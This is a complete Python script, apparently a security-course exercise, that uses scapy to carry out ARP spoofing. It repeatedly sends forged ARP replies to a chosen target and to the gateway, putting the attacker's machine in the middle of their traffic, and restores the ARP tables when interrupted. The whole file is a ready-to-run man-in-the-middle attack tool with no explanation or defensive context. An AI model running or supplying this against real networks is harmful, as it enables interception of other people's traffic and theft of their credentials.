import scapy.all as scapy
import time
import sys
import argparse

def get_mac(ip):
   arp_request = scapy.ARP(pdst=ip)
   broadcast= scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
   arp_request_broadcast= broadcast/arp_request
   answered_list, unanswered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)

   return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
   target_mac = get_mac(target_ip)
   packet = scapy.ARP(op=2, pdst=target_ip, hwdst= target_mac, psrc = spoof_ip)
   scapy.send(packet,verbose = False)

def restore(destination_ip,source_ip):
   destination_mac = get_mac(destination_ip)
   source_mac = get_mac(source_ip)
   packet = scapy.ARP(op = 2, pdst = destination_ip,hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
   scapy.send(packet, count=4, verbose=False)

def get_arguments():
   parser = argparse.ArgumentParser()
   parser.add_argument('-t','--target', dest ='target', help = 'Target IP')
   parser.add_argument('-g','--gate', dest ='gateway', help = 'Gateway IP')
   options=parser.parse_args()
   return options.gateway,options.target

try:
   packets_sent_count = 0
   gateway_ip, target_ip = get_arguments()
   while True:
      spoof(target_ip, gateway_ip)
      spoof(gateway_ip, target_ip)
      packets_sent_count+=2
      print(f'\rSent {packets_sent_count}')
      time.sleep(2)
except:
   restore(target_ip,gateway_ip)